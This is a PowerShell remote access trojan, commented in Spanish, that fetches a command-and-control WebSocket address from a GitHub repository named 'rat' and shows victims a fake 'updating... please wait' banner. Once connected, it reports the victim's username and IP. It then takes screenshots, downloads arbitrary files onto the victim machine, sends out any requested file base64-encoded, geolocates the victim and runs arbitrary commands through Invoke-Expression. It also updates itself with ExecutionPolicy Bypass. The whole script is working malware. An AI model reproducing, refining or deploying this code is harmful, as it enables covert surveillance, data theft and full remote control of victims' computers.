
# --- CONFIGURACIÓN DEL AUTO-UPDATER ---
# ** IMPORTANTE **: Actualiza la versión local si haces cambios que no se autoupdatean
$CurrentScriptVersion = "1.0.3" # Incrementamos la versión por los ajustes de depuración

# URLs de actualización (asegúrate de que sean las correctas y accesibles)
$VersionCheckUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/version"
# ** CORRECCIÓN AQUÍ **: Usar {0} en lugar de %7B0%7D para la plantilla de descarga
$ScriptDownloadUrlTemplate = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/cli.ps1" 

# --- CONFIGURACIÓN DEL WEBSOCKET ---
# URL del archivo de texto que contiene la URI del WebSocket
$UriConfigUrl = "https://raw.githubusercontent.com/pulgax-g/rat/refs/heads/main/url"

# Tiempos de espera (en segundos)
$connectionTimeoutSeconds = 300 # Timeout para la conexión inicial y para ReceiveAsync
$reconnectDelaySeconds = 1      # Tiempo de espera mínimo entre intentos de reconexión

# --- COMIENZO DEL SCRIPT ---

# Agrega los ensamblados necesarios
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms

# --- OBTENER URI DESDE GITHUB ---
$uri = $null
try {
    # Usar -UseBasicParsing para Invoke-RestMethod en entornos sin Internet Explorer
    $uri = Invoke-RestMethod -Uri $UriConfigUrl -UseBasicParsing -TimeoutSec 10
    $uri = $uri.Trim()
    if ([string]::IsNullOrWhiteSpace($uri)) {
        throw "La URI obtenida está vacía o es nula."
    }
    Clear-Host
    Write-Host "                            __              __                         "
    Write-Host "                           /  |            /  |                        "
    Write-Host "  __    __   ______    ____$$ |  ______   _$$ |_     ______    ______  "
    Write-Host " /  |  /  | /      \  /    $$ | /      \ / $$   |   /      \  /      \ "
    Write-Host " $$ |  $$ |/$$$$$$  |/$$$$$$$ | $$$$$$  |$$$$$$/   /$$$$$$  |/$$$$$$  |"
    Write-Host " $$ |  $$ |$$ |  $$ |$$ |  $$ | /    $$ |  $$ | __ $$    $$ |$$ |  $$/ "
    Write-Host " $$ \__$$ |$$ |__$$ |$$ \__$$ |/$$$$$$$ |  $$ |/  |$$$$$$$$/ $$ |      "
    Write-Host " $$    $$/ $$    $$/ $$    $$ |$$    $$ |  $$  $$/ $$       |$$ |      "
    Write-Host "  $$$$$$/  $$$$$$$/   $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$/ $$/       "
    Write-Host "           $$ |                    DO NOT CLOSE                                    "
    Write-Host "           $$ |                updating... please wait                    "                    
    Write-Host "           $$/                                                     "
} catch {
    Write-Error "No se pudo obtener la URI del WebSocket. Error: $($_.Exception.Message)"
    # Si no podemos obtener la URI, no podemos continuar. Salimos.
    Exit
}

# --- FUNCIÓN DE AUTO-UPDATER ---
function Update-Script {
    param(
        [string]$currentVersion,
        [string]$versionUrl,
        [string]$downloadUrlTemplate
    )

    Write-Host "Verificando actualizaciones en $versionUrl..."
    $latestVersion = $null
    try {
        $latestVersion = Invoke-RestMethod -Uri $versionUrl -UseBasicParsing -TimeoutSec 10
        $latestVersion = $latestVersion.Trim()
        Write-Host "Última versión disponible reportada: $latestVersion"
    } catch {
        Write-Warning "No se pudo verificar la versión del script. Error: $($_.Exception.Message)"
        return # Continuar con la versión actual si no se puede verificar
    }

    # Comparar versiones. Asegúrate de que $latestVersion y $currentVersion sean comparables (ej. "1.0.0")
    if ($latestVersion -ne $null -and [version]$latestVersion -gt [version]$currentVersion) {
        Write-Host "¡Hay una nueva versión disponible ($latestVersion)! Descargando..."
        # ** CORRECCIÓN AQUÍ **: Usar el operador -f para formatear la URL de descarga
        $downloadUrl = $downloadUrlTemplate -f $latestVersion 
        $scriptPath = $MyInvocation.MyCommand.Path # Ruta del script actual
        $tempScriptPath = "$scriptPath.tmp" # Archivo temporal para la descarga

        try {
            Write-Host "Descargando desde: $downloadUrl"
            # Realiza la descarga con un timeout generoso
            Invoke-WebRequest -Uri $downloadUrl -OutFile $tempScriptPath -UseBasicParsing -TimeoutSec 120
            Write-Host "Descarga completada. Reemplazando script actual..."

            # Pequeña pausa para asegurar que el archivo original no esté bloqueado
            Start-Sleep -Seconds 2

            # Eliminar el script actual si existe
            if (Test-Path $scriptPath) {
                Remove-Item $scriptPath -Force
            }

            # Renombrar el archivo descargado al nombre del script original
            Rename-Item $tempScriptPath -NewName $scriptPath -Force

            Write-Host "Script actualizado a la versión $latestVersion. Reiniciando..."
            
            # Iniciar una nueva instancia de PowerShell con el script actualizado
            Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            
            # Cerrar el proceso actual una vez que la nueva instancia se ha iniciado
            Exit

        } catch {
            Write-Error "Error durante la actualización del script. $($_.Exception.Message)"
            # Limpiar el archivo temporal si ocurrió un error
            if (Test-Path $tempScriptPath) {
                Remove-Item $tempScriptPath -Force
            }
        }
    } else {
        Write-Host "El script está actualizado (Versión $currentVersion)."
    }
}

# Connect WebSocket
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()

# System data
$user = $env:USERNAME
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "169.254*" } | Select-Object -First 1 -ExpandProperty IPAddress)

# Function to send text to the server
function Send-Back($text) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($text)
    $ws.SendAsync(
        [System.ArraySegment[byte]]::new($bytes),
        [System.Net.WebSockets.WebSocketMessageType]::Text,
        $true,
        [System.Threading.CancellationToken]::None
    ).Wait()
}

# Connection notice
Send-Back "$user $ip se ha conectado"

$buffer = New-Object byte[] 16384

while ($true) {

    $result = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None).Result
    if ($result.Count -le 0) { continue }

    $msg = [Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count).Trim()
    if ([string]::IsNullOrWhiteSpace($msg)) { continue }

    # /help
    if ($msg -eq "/help") {
        Send-Back "Comandos disponibles:`n/help`n&sshot`n&dw <url>`n&get <ruta>`n&location`n!<comando>"
        continue
    }

    # &sshot (capture local screen)
    if ($msg -eq "&sshot") {
        try {
            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
            $gfx = [System.Drawing.Graphics]::FromImage($bmp)
            $gfx.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

            $path = "$env:USERPROFILE\Desktop\captura_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
            $bmp.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)

            $gfx.Dispose()
            $bmp.Dispose()

            Send-Back "Captura guardada en: $path"
        } catch {
            Send-Back "Error al capturar pantalla"
        }
        continue
    }

    # &download URL
    if ($msg.StartsWith("&dw ")) {
        try {
            $url = $msg.Substring(4).Trim()
            $file = Split-Path $url -Leaf
            $dest = "$env:USERPROFILE\Downloads\$file"
            Invoke-WebRequest $url -OutFile $dest -UseBasicParsing
            Send-Back "Descarga completada: $dest"
        } catch {
            Send-Back "Error en descarga"
        }
        continue
    }

    # &get RUTA (without local confirmation)
    if ($msg.StartsWith("&get ")) {
        $path = $msg.Substring(5).Trim()
        if (-not (Test-Path $path)) {
            Send-Back "Archivo no existe: $path"
            continue
        }

        try {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            $b64 = [Convert]::ToBase64String($bytes)
            $payload = "FILE:" + (Split-Path $path -Leaf) + ":" + $b64
            Send-Back $payload
        } catch {
            Send-Back "Error enviando archivo"
        }
        continue
    }

    # &location (steal exact location)
    if ($msg -eq "&location") {
        try {
            $location = Invoke-RestMethod -Uri "http://ipinfo.io/json"
            $city = $location.city
            $region = $location.region
            $country = $location.country
            $loc = "$city, $region, $country"
            Send-Back "Ubicación exacta: $loc"
        } catch {
            Send-Back "Error obteniendo ubicación"
        }
        continue
    }

    # !comando → executes only if it starts with !
    if ($msg.StartsWith("!")) {
        $command = $msg.Substring(1)
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
            if ([string]::IsNullOrWhiteSpace($output)) {
                $output = "[sin salida]"
            }
            Send-Back $output
        } catch {
            Send-Back "[comando inválido o error ejecutando comando]"
        }
    }
}
